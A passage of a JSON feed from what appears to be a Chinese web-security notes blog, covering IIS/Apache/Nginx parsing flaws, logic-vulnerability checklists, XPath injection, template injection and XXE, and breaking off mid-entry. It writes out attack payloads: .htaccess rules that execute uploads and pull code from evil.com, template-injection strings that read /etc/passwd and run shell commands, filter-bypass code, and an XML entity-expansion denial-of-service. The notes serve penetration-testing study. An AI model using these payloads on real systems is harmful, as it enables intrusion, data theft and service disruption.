时才会生成短文件名，如果包含空格或者其他部分特殊字符，则无视长度条件</li>\n</ul>\n<p>IIS 8.0 之前的版本支持短文件名猜测的 HTTP 方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE 六种，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1BU1AtcGQwZnEwMXJnNmE4NDRkLk5FVA==\">需要安装 ASP.NET</span>。而 IIS 8.0 之后的版本只能通过 OPTIONS 和 TRACE 方法猜测成功，但是没有 ASP.NET 的限制。</p>\n<p>这种方法的局限性在于：</p>\n<ul>\n<li>文件夹名前 6 位字符带点”.”，扫描程序会认为是文件而不是文件夹，最终出现误报</li>\n<li>不支持中文文件名</li>\n</ul>\n<p>这种方法可以通过命令  <code>fsutil behavior set disable8dot3 1</code>  关闭 NTFS 8.3 文件格式的支持来修复。</p>\n<h2 id=\"41516-参考链接\"><a class=\"anchor\" href=\"#41516-参考链接\">#</a> 4.15.1.6. 参考链接</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjMxOA==\">利用 Windows 特性高效猜测目录</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zb3JvdXNoLnNlY3Byb2plY3QuY29tL2Jsb2cvMjAxOS8wOC91cGxvYWRpbmctd2ViLWNvbmZpZy1mb3ItZnVuLWFuZC1wcm9maXQtMi8=\">Uploading web.config for Fun and Profit 2</span></li>\n</ul>\n<h1 id=\"apache\"><a class=\"anchor\" href=\"#apache\">#</a> Apache</h1>\n<h2 id=\"后缀解析\"><a class=\"anchor\" href=\"#后缀解析\">#</a> 后缀解析</h2>\n<p><code>test.php.x1.x2.x3</code>  （ x1,x2,x3 为没有在 mime.types 文件中定义的文件类型）。Apache 将从右往左开始判断后缀， 若 x3 为非可识别后缀，则判断 x2，直到找到可识别后缀为止，然后对可识别后缀进行解析</p>\n<h2 id=\"htaccess\"><a class=\"anchor\" href=\"#htaccess\">#</a> .htaccess</h2>\n<p>当 AllowOverride 被启用时，上传启用解析规则的.htaccess</p>\n<pre><code>AddType application/x-httpd-php .jpg\nphp_value auto_append_file .htaccess\n#&lt;?php phpinfo();\nOptions ExecCGI\nAddHandler cgi-script .jpg\nOptions +ExecCGI\nAddHandler fcgid-script .gif\nFcgidWrapper &quot;/bin/bash&quot; .gif\nphp_flag allow_url_include 1\nphp_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==\n#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B\n#php_value auto_append_file https://evil.com/evil-code.txt\n</code></pre>\n<h2 id=\"目录遍历\"><a class=\"anchor\" href=\"#目录遍历\">#</a> 目录遍历</h2>\n<p>配置  <code>Options +Indexes</code>  时 Apache 存在目录遍历漏洞。</p>\n<h2 id=\"cve-2017-15715\"><a class=\"anchor\" href=\"#cve-2017-15715\">#</a> CVE-2017-15715</h2>\n<p><code>%0A</code>  绕过上传黑名单。</p>\n<h2 id=\"lighttpd\"><a class=\"anchor\" href=\"#lighttpd\">#</a> lighttpd</h2>\n<pre><code>xx.jpg/xx.php\n</code></pre>\n<h2 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vYXBhY2hlLWN2ZS0yMDE3LTE1NzE1LXZ1bG5lcmFiaWxpdHkuaHRtbA==\">Apache 上传绕过</span></li>\n</ul>\n<h1 id=\"nginx\"><a class=\"anchor\" href=\"#nginx\">#</a> Nginx</h1>\n<h2 id=\"fast-cgi关闭\"><a class=\"anchor\" href=\"#fast-cgi关闭\">#</a> Fast-CGI 关闭</h2>\n<p>在 Fast-CGI 关闭的情况下， Nginx 仍然存在解析漏洞： 在文件路径 (xx.jpg) 后面加上  <code>%00.php</code>  ， 即  <code>xx.jpg%00.php</code>  会被当做 php 文件来解析</p>\n<h2 id=\"fast-cgi开启\"><a class=\"anchor\" href=\"#fast-cgi开启\">#</a> Fast-CGI 开启</h2>\n<p>在 Fast-CGI 开启状态下，在文件路径后加上  <code>/xx.php</code>  ，则  <code>xx.jpg/xx.php</code>  会被解析为 php 文件</p>\n<h2 id=\"cve-2013-4547\"><a class=\"anchor\" href=\"#cve-2013-4547\">#</a> CVE-2013-4547</h2>\n<pre><code>a.jpg\\x20\\x00.php\n</code></pre>\n<h2 id=\"配置错误\"><a class=\"anchor\" href=\"#配置错误\">#</a> 配置错误</h2>\n<h3 id=\"目录穿越\"><a class=\"anchor\" href=\"#目录穿越\">#</a> 目录穿越</h3>\n<p>如果配置中存在类似  <code>location /foo &#123; alias /bar/; &#125;</code>  的配置时， <code>/foo../</code>  会被解析为  <code>/bar/../</code>  从而导致目录穿越的发生。</p>\n<h3 id=\"目录遍历-2\"><a class=\"anchor\" href=\"#目录遍历-2\">#</a> 目录遍历</h3>\n<p>配置中  <code>autoindex on</code>  开启时，Nginx 中存在目录遍历漏洞。</p>\n<h2 id=\"参考链接-2\"><a class=\"anchor\" href=\"#参考链接-2\">#</a> 参考链接</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy45MXJpLm9yZy85MDY0Lmh0bWw=\">CVE-2013-4547 Nginx 解析漏洞深入利用及分析</span></li>\n</ul>\n",
            "tags": [
                "网络安全",
                "中间件",
                "IIS",
                "Apache",
                "Nginx"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8/",
            "title": "配置与策略安全",
            "date_published": "2022-11-27T02:57:09.000Z",
            "content_html": "<h1 id=\"认证策略\"><a class=\"anchor\" href=\"#认证策略\">#</a> 认证策略</h1>\n<h2 id=\"密码策略\"><a class=\"anchor\" href=\"#密码策略\">#</a> 密码策略</h2>\n<ul>\n<li>未限制密码最低位数</li>\n<li>未限制密码必须包含字符集</li>\n<li>为常用密码</li>\n<li>个人信息相关\n<ul>\n<li>手机号</li>\n<li>生日</li>\n<li>姓名</li>\n<li>用户名</li>\n</ul>\n</li>\n<li>未检测常见弱密码\n<ul>\n<li>已泄露的常用密码</li>\n<li>键盘模式</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"加密实现\"><a class=\"anchor\" href=\"#加密实现\">#</a> 加密实现</h2>\n<ul>\n<li>在客户端存储私钥</li>\n</ul>\n<h1 id=\"权限配置\"><a class=\"anchor\" href=\"#权限配置\">#</a> 权限配置</h1>\n<ul>\n<li>运维人员权限粒度过大</li>\n<li>客服人员权限粒度过大</li>\n</ul>\n<h1 id=\"供应链安全\"><a class=\"anchor\" href=\"#供应链安全\">#</a> 供应链安全</h1>\n<h2 id=\"三方认证\"><a class=\"anchor\" href=\"#三方认证\">#</a> 三方认证</h2>\n<ul>\n<li>利用被攻击的第三方服务账号登录其他平台账号</li>\n</ul>\n<h2 id=\"三方库软件\"><a class=\"anchor\" href=\"#三方库软件\">#</a> 三方库 / 软件</h2>\n<ul>\n<li>公开漏洞后没有及时更新</li>\n</ul>\n",
            "tags": [
                "网络安全",
                "策略配置"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E3%80%81%E4%B8%9A%E5%8A%A1%E6%BC%8F%E6%B4%9E/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E3%80%81%E4%B8%9A%E5%8A%A1%E6%BC%8F%E6%B4%9E/",
            "title": "逻辑漏洞/业务漏洞",
            "date_published": "2022-11-27T02:50:09.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>逻辑漏洞是指由于程序逻辑不严导致一些逻辑分支处理错误造成的漏洞。</p>\n<p>在实际开发中，因为开发者水平不一没有安全意识，而且业务发展迅速内部测试没有及时到位，所以常常会出现类似的漏洞。</p>\n<h1 id=\"安装逻辑\"><a class=\"anchor\" href=\"#安装逻辑\">#</a> 安装逻辑</h1>\n<ul>\n<li>查看能否绕过判定重新安装</li>\n<li>查看能否利用安装文件获取信息</li>\n<li>看能否利用更新功能获取信息</li>\n</ul>\n<h1 id=\"交易\"><a class=\"anchor\" href=\"#交易\">#</a> 交易</h1>\n<h2 id=\"购买\"><a class=\"anchor\" href=\"#购买\">#</a> 购买</h2>\n<ul>\n<li>修改支付的价格</li>\n<li>修改支付的状态</li>\n<li>修改购买数量为负数</li>\n<li>修改金额为负数</li>\n<li>重放成功的请求</li>\n<li>并发数据库锁处理不当</li>\n</ul>\n<h2 id=\"业务风控\"><a class=\"anchor\" href=\"#业务风控\">#</a> 业务风控</h2>\n<ul>\n<li>刷优惠券</li>\n<li>套现</li>\n</ul>\n<h1 id=\"账户\"><a class=\"anchor\" href=\"#账户\">#</a> 账户</h1>\n<h2 id=\"注册\"><a class=\"anchor\" href=\"#注册\">#</a> 注册</h2>\n<ul>\n<li>覆盖注册</li>\n<li>尝试重复用户名</li>\n<li>注册遍历猜解已有账号</li>\n</ul>\n<h2 id=\"密码\"><a class=\"anchor\" href=\"#密码\">#</a> 密码</h2>\n<ul>\n<li>密码未使用哈希算法保存</li>\n<li>没有验证用户设置密码的强度</li>\n</ul>\n<h2 id=\"邮箱用户名\"><a class=\"anchor\" href=\"#邮箱用户名\">#</a> 邮箱用户名</h2>\n<ul>\n<li>前后空格</li>\n<li>大小写变换</li>\n</ul>\n<h2 id=\"cookie\"><a class=\"anchor\" href=\"#cookie\">#</a> Cookie</h2>\n<ul>\n<li>包含敏感信息</li>\n<li>未验证合法性可伪造</li>\n</ul>\n<h2 id=\"手机号用户名\"><a class=\"anchor\" href=\"#手机号用户名\">#</a> 手机号用户名</h2>\n<ul>\n<li>前后空格</li>\n<li>+86</li>\n</ul>\n<h2 id=\"登录\"><a class=\"anchor\" href=\"#登录\">#</a> 登录</h2>\n<ul>\n<li>\n<p>撞库</p>\n<ul>\n<li>设置异地登录检查等机制</li>\n</ul>\n</li>\n<li>\n<p>账号劫持</p>\n</li>\n<li>\n<p>恶意尝试帐号密码锁死账户</p>\n<ul>\n<li>需要设置锁定机制与解锁机制</li>\n</ul>\n</li>\n<li>\n<p>不安全的传输信道</p>\n</li>\n<li>\n<p>登录凭证存储在不安全的位置</p>\n</li>\n</ul>\n<h2 id=\"找回密码\"><a class=\"anchor\" href=\"#找回密码\">#</a> 找回密码</h2>\n<ul>\n<li>重置任意用户密码</li>\n<li>密码重置后新密码在返回包中</li>\n<li>Token 验证逻辑在前端</li>\n<li>X-Forwarded-Host 处理不正确</li>\n<li>找回密码功能泄露用户敏感信息</li>\n</ul>\n<h1 id=\"修改密码\"><a class=\"anchor\" href=\"#修改密码\">#</a> 修改密码</h1>\n<ul>\n<li>越权修改密码</li>\n<li>修改密码没有旧密码验证</li>\n</ul>\n<h2 id=\"申诉\"><a class=\"anchor\" href=\"#申诉\">#</a> 申诉</h2>\n<ul>\n<li>身份伪造</li>\n<li>逻辑绕过</li>\n</ul>\n<h2 id=\"更新\"><a class=\"anchor\" href=\"#更新\">#</a> 更新</h2>\n<ul>\n<li>ORM 更新操作不当可更新任意字段</li>\n<li>权限限制不当可以越权修改</li>\n</ul>\n<h2 id=\"信息查询\"><a class=\"anchor\" href=\"#信息查询\">#</a> 信息查询</h2>\n<ul>\n<li>权限限制不当可以越权查询</li>\n<li>用户信息 ID 可以猜测导致遍历</li>\n</ul>\n<h1 id=\"2fa\"><a class=\"anchor\" href=\"#2fa\">#</a> 2FA</h1>\n<ul>\n<li>重置密码后自动登录没有 2FA</li>\n<li>OAuth 登录没有启用 2FA</li>\n<li>2FA 可爆破</li>\n<li>2FA 有条件竞争</li>\n<li>修改返回值绕过</li>\n<li>激活链接没有启用 2FA</li>\n<li>可通过 CSRF 禁用 2FA</li>\n</ul>\n<h1 id=\"验证码\"><a class=\"anchor\" href=\"#验证码\">#</a> 验证码</h1>\n<ul>\n<li>验证码可重用</li>\n<li>验证码可预测</li>\n<li>验证码强度不够</li>\n<li>验证码无时间限制或者失效时间长</li>\n<li>验证码无猜测次数限制</li>\n<li>验证码传递特殊的参数或不传递参数绕过</li>\n<li>验证码可从返回包中直接获取</li>\n<li>验证码不刷新或无效</li>\n<li>验证码数量有限</li>\n<li>验证码在数据包中返回</li>\n<li>修改 Cookie 绕过</li>\n<li>修改返回包绕过</li>\n<li>验证码在客户端生成或校验</li>\n<li>验证码可 OCR 或使用机器学习识别</li>\n<li>验证码用于手机短信 / 邮箱轰炸</li>\n</ul>\n<h1 id=\"session\"><a class=\"anchor\" href=\"#session\">#</a> Session</h1>\n<ul>\n<li>Session 机制</li>\n<li>Session 猜测 / 爆破</li>\n<li>Session 伪造</li>\n<li>Session 泄漏</li>\n<li>Session Fixation</li>\n</ul>\n<h1 id=\"越权\"><a class=\"anchor\" href=\"#越权\">#</a> 越权</h1>\n<ul>\n<li>\n<p>未授权访问</p>\n<ul>\n<li>静态文件</li>\n<li>通过特定 url 来防止被访问</li>\n</ul>\n</li>\n<li>\n<p>水平越权</p>\n<ul>\n<li>攻击者可以访问与他拥有相同权限的用户的资源</li>\n<li>权限类型不变，ID 改变</li>\n</ul>\n</li>\n<li>\n<p>垂直越权</p>\n<ul>\n<li>低级别攻击者可以访问高级别用户的资源</li>\n<li>权限 ID 不变，类型改变</li>\n</ul>\n</li>\n<li>\n<p>交叉越权</p>\n<ul>\n<li>权限 ID 改变，类型改变</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"随机数安全\"><a class=\"anchor\" href=\"#随机数安全\">#</a> 随机数安全</h1>\n<ul>\n<li>使用不安全的随机数发生器</li>\n<li>使用时间等易猜解的因素作为随机数种子</li>\n</ul>\n<h1 id=\"其他\"><a class=\"anchor\" href=\"#其他\">#</a> 其他</h1>\n<ul>\n<li>用户 / 订单 / 优惠券等 ID 生成有规律，可枚举</li>\n<li>接口无权限、次数限制</li>\n<li>加密算法实现误用</li>\n<li>执行顺序</li>\n<li>敏感信息泄露</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuY3Nkbi5uZXQvbXlsdXR0ZS9hcnRpY2xlL2RldGFpbHMvNTA4MTkxNDYjMTAwMDYtd2VpeGluLTEtNTI2MjYtNmIzYmZmZDAxZmRkZTQ5MDAxMzBiYzVhMjc1MWI2ZDE=\">水平越权漏洞及其解决方案</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjAyOQ==\">细说验证码安全 测试思路大梳理</span></li>\n</ul>\n",
            "tags": [
                "网络安全",
                "漏洞",
                "逻辑"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/Xpath/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/Xpath/",
            "title": "Xpath",
            "date_published": "2022-11-27T02:44:09.000Z",
            "content_html": "<h1 id=\"xpath定义\"><a class=\"anchor\" href=\"#xpath定义\">#</a> Xpath 定义</h1>\n<p>XPath 注入攻击是指利用 XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的 XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath 注入攻击是针对 Web 服务应用新的攻击方法，它允许攻击者在事先不知道 XPath 查询相关知识的情况下，通过 XPath 查询得到一个 XML 文档的完整内容。</p>\n<h1 id=\"xpath注入攻击原理\"><a class=\"anchor\" href=\"#xpath注入攻击原理\">#</a> Xpath 注入攻击原理</h1>\n<blockquote>\n<p>XPath 注入攻击主要是通过构建特殊的输入，这些输入往往是 XPath 语法中的一些组合，这些输入将作为参数传入 Web 应用程序，通过执行 XPath 查询而执行入侵者想要的操作，下面以登录验证中的模块为例，说明 XPath 注入攻击的实现原理。</p>\n</blockquote>\n<p>在 Web 应用程序的登录验证程序中，一般有用户名（username）和密码（password） 两个参数，程序会通过用户所提交输入的用户名和密码来执行授权操作。若验证数据存放在 XML 文件中，其原理是通过查找 user 表中的用户名 （username）和密码（password）的结果来进行授权访问，</p>\n<p>例存在 user.xml 文件如下：</p>\n<pre><code>&lt;users&gt;\n     &lt;user&gt;\n         &lt;firstname&gt;Ben&lt;/firstname&gt;\n         &lt;lastname&gt;Elmore&lt;/lastname&gt;\n         &lt;loginID&gt;abc&lt;/loginID&gt;\n         &lt;password&gt;test123&lt;/password&gt;\n     &lt;/user&gt;\n     &lt;user&gt;\n         &lt;firstname&gt;Shlomy&lt;/firstname&gt;\n         &lt;lastname&gt;Gantz&lt;/lastname&gt;\n         &lt;loginID&gt;xyz&lt;/loginID&gt;\n         &lt;password&gt;123test&lt;/password&gt;\n     &lt;/user&gt;\n</code></pre>\n<p>则在 XPath 中其典型的查询语句为：  <code>//users/user[loginID/text()='xyz'and password/text()='123test']</code></p>\n<p>但是，可以采用如下的方法实施注入攻击，绕过身份验证。如果用 户传入一个 login 和 password，例如  <code>loginID = 'xyz' 和 password = '123test'</code>  ，则该查询语句将返回 true。但如果用户传入类似  <code>' or 1=1 or ''='</code>  的值，那么该查询语句也会得到 true 返回值，因为 XPath 查询语句最终会变成如下代码： <code>//users/user[loginID/text()=''or 1=1 or ''='' and password/text()='' or 1=1 or ''='']</code></p>\n<p>这个字符串会在逻辑上使查询一直返回 true 并将一直允许攻击者访问系统。攻击者可以利用 XPath 在应用程序中动态地操作 XML 文档。攻击完成登录可以再通过 XPath 盲入技术获取最高权限帐号和其它重要文档信息。</p>\n",
            "tags": [
                "网络安全",
                "漏洞",
                "Xpath"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/",
            "title": "模板注入",
            "date_published": "2022-11-27T01:51:54.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。</p>\n<h1 id=\"测试方法\"><a class=\"anchor\" href=\"#测试方法\">#</a> 测试方法</h1>\n<ul>\n<li>确定使用的引擎</li>\n<li>查看引擎相关的文档，确定其安全机制以及自带的函数和变量</li>\n<li>需找攻击面，尝试攻击</li>\n</ul>\n<h1 id=\"测试用例\"><a class=\"anchor\" href=\"#测试用例\">#</a> 测试用例</h1>\n<ul>\n<li>\n<p>简单的数学表达式， <code>&#123;&#123; 7+7 &#125;&#125; =&gt; 14</code></p>\n</li>\n<li>\n<p>字符串表达式  <code>&#123;&#123; \"ajin\" &#125;&#125; =&gt; ajin</code></p>\n</li>\n<li>\n<p>Ruby</p>\n<ul>\n<li><code>&lt;%= 7 * 7 %&gt;</code></li>\n<li><code>&lt;%= File.open('/etc/passwd').read %&gt;</code></li>\n</ul>\n</li>\n<li>\n<p>Java</p>\n<ul>\n<li><code>$&#123;7*7&#125;</code></li>\n</ul>\n</li>\n<li>\n<p>Twig</p>\n<ul>\n<li><code>&#123;&#123;7*7&#125;&#125;</code></li>\n</ul>\n</li>\n<li>\n<p>Smarty</p>\n<ul>\n<li><code>&#123;php&#125;echo `id`;&#123;/php&#125;</code></li>\n</ul>\n</li>\n<li>\n<p>AngularJS</p>\n<ul>\n<li><code>$eval('1+1')</code></li>\n</ul>\n</li>\n<li>\n<p>Tornado</p>\n<ul>\n<li>引用模块  <code>&#123;% import module %&#125;</code></li>\n<li>=&gt;  <code>&#123;% import os %&#125;&#123;&#123; os.popen(\"whoami\").read() &#125;&#125;</code></li>\n</ul>\n</li>\n<li>\n<p>Flask/Jinja2</p>\n<ul>\n<li><code>&#123;&#123; config &#125;&#125;</code></li>\n<li><code>&#123;&#123; config.items() &#125;&#125;</code></li>\n<li><code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;</code></li>\n<li><code>&#123;&#123;''.__class__.__mro__[-1].__subclasses__()&#125;&#125;</code></li>\n<li><code>&#123;&#123; url_for.__globals__['__builtins__'].__import__('os').system('ls') &#125;&#125;</code></li>\n<li><code>&#123;&#123; request.__init__.__globals__['__builtins__'].open('/etc/passwd').read() &#125;&#125;</code></li>\n</ul>\n</li>\n<li>\n<p>Django</p>\n<ul>\n<li><code>&#123;&#123; request &#125;&#125;</code></li>\n<li><code>&#123;% debug %&#125;</code></li>\n<li><code>&#123;% load module %&#125;</code></li>\n<li><code>&#123;% include \"x.html\" %&#125;</code></li>\n<li><code>&#123;% extends \"x.html\" %&#125;</code></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"目标\"><a class=\"anchor\" href=\"#目标\">#</a> 目标</h1>\n<ul>\n<li>创建对象</li>\n<li>文件读写</li>\n<li>远程文件包含</li>\n<li>信息泄漏</li>\n<li>提权</li>\n</ul>\n<h1 id=\"相关属性\"><a class=\"anchor\" href=\"#相关属性\">#</a> 相关属性</h1>\n<h2 id=\"__class__\"><a class=\"anchor\" href=\"#__class__\">#</a>  <code>__class__</code></h2>\n<p>python 中的新式类（即显示继承 object 对象的类）都有一个属性  <code>__class__</code>  用于获取当前实例对应的类，例如  <code>&quot;&quot;.__class__</code>  就可以获取到字符串实例对应的类</p>\n<h2 id=\"__mro__\"><a class=\"anchor\" href=\"#__mro__\">#</a>  <code>__mro__</code></h2>\n<p>python 中类对象的  <code>__mro__</code>  属性会返回一个 tuple 对象，其中包含了当前类对象所有继承的基类，tuple 中元素的顺序是 MRO（Method Resolution Order） 寻找的顺序。</p>\n<h2 id=\"__globals__\"><a class=\"anchor\" href=\"#__globals__\">#</a>  <code>__globals__</code></h2>\n<p>保存了函数所有的所有全局变量，在利用中，可以使用  <code>__init__</code>  获取对象的函数，并通过  <code>__globals__</code>  获取  <code>file</code>   <code>os</code>  等模块以进行下一步的利用</p>\n<h2 id=\"__subclasses__\"><a class=\"anchor\" href=\"#__subclasses__\">#</a>  <code>__subclasses__()</code></h2>\n<p>python 的新式类都保留了它所有的子类的引用， <code>__subclasses__()</code>  这个方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。</p>\n<p>因为 python 中的类都是继承 object 的，所以只要调用 object 类对象的  <code>__subclasses__()</code>  方法就可以获取想要的类的对象。</p>\n<h1 id=\"常见payload\"><a class=\"anchor\" href=\"#常见payload\">#</a> 常见 Payload</h1>\n<ul>\n<li><code>().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()</code></li>\n<li><code>().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()' )</code></li>\n</ul>\n<h1 id=\"绕过技巧\"><a class=\"anchor\" href=\"#绕过技巧\">#</a> 绕过技巧</h1>\n<h2 id=\"字符串拼接\"><a class=\"anchor\" href=\"#字符串拼接\">#</a> 字符串拼接</h2>\n<pre><code>request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]\n</code></pre>\n<h2 id=\"使用参数绕过\"><a class=\"anchor\" href=\"#使用参数绕过\">#</a> 使用参数绕过</h2>\n<pre><code>params = &#123;\n    'clas': '__class__',\n    'mr': '__mro__',\n    'subc': '__subclasses__'\n&#125;\ndata = &#123;\n    &quot;data&quot;: &quot;&#123;&#123;''[request.args.clas][request.args.mr][1][request.args.subc]()&#125;&#125;&quot;\n&#125;\nr = requests.post(url, params=params, data=data)\nprint(r.text)\n</code></pre>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yODgyMzkzMw==\">服务端模版注入</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cua25vd25zZWMuY29tLzIwMTYvMDIvdXNlLXB5dGhvbi1mZWF0dXJlcy10by1leGVjdXRlLWFyYml0cmFyeS1jb2Rlcy1pbi1qaW5qYTItdGVtcGxhdGVzLw==\">用 Python 特性任意代码执行</span></li>\n</ul>\n",
            "tags": [
                "注入",
                "绕过"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/XXE/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/XXE/",
            "title": "XXE",
            "date_published": "2022-11-27T01:31:19.000Z",
            "content_html": "<h1 id=\"xml基础\"><a class=\"anchor\" href=\"#xml基础\">#</a> XML 基础</h1>\n<p>XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素。目前，XML 文件作为配置文件（Spring、Struts2 等）、文档结构说明文件（PDF、RSS 等）、图片格式文件（SVG header）应用比较广泛。 XML 的语法规范由 DTD （Document Type Definition）来进行控制。</p>\n<h1 id=\"基本语法\"><a class=\"anchor\" href=\"#基本语法\">#</a> 基本语法</h1>\n<p>XML 文档在开头有  <code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code>  的结构，这种结构被称为 XML prolog ，用于声明 XML 文档的版本和编码，是可选的，但是必须放在文档开头。</p>\n<p>除了可选的开头外，XML 语法主要有以下的特性：</p>\n<ul>\n<li>所有 XML 元素都须有关闭标签</li>\n<li>XML 标签对大小写敏感</li>\n<li>XML 必须正确地嵌套</li>\n<li>XML 文档必须有根元素</li>\n<li>XML 的属性值需要加引号</li>\n</ul>\n<p>另外，XML 也有 CDATA 语法，用于处理有多个字符需要转义的情况。</p>\n<h1 id=\"xxe\"><a class=\"anchor\" href=\"#xxe\">#</a> XXE</h1>\n<p>当允许引用外部实体时，可通过构造恶意的 XML 内容，导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等后果。一般的 XXE 攻击，只有在服务器有回显或者报错的基础上才能使用 XXE 漏洞来读取服务器端文件，但是也可以通过 Blind XXE 的方式实现攻击。</p>\n<h1 id=\"攻击方式\"><a class=\"anchor\" href=\"#攻击方式\">#</a> 攻击方式</h1>\n<h2 id=\"拒绝服务攻击\"><a class=\"anchor\" href=\"#拒绝服务攻击\">#</a> 拒绝服务攻击</h2>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">data</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\"></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">data</span> <span class=\"token attr-name\">(#ANY)</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ENTITY</span> <span class=\"token attr-name\">a0</span> <span class=\"token attr-name\">\"dos\"</span> <span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ENTITY</span> <span class=\"token attr-name\">a1</span> <span class=\"token attr-name\">\"&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;\"</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ENTITY</span> <span class=\"token attr-name\">a2</span> <span class=\"token attr-name\">\"&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;\"</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>data</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&a2;\">&amp;a2;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>data</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。 具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。</p>\n<h2 id=\"文件读取\"><a class=\"anchor\" href=\"#文件读取\">#</a> 文件读取</h2>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version=\"1.0\"?></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token 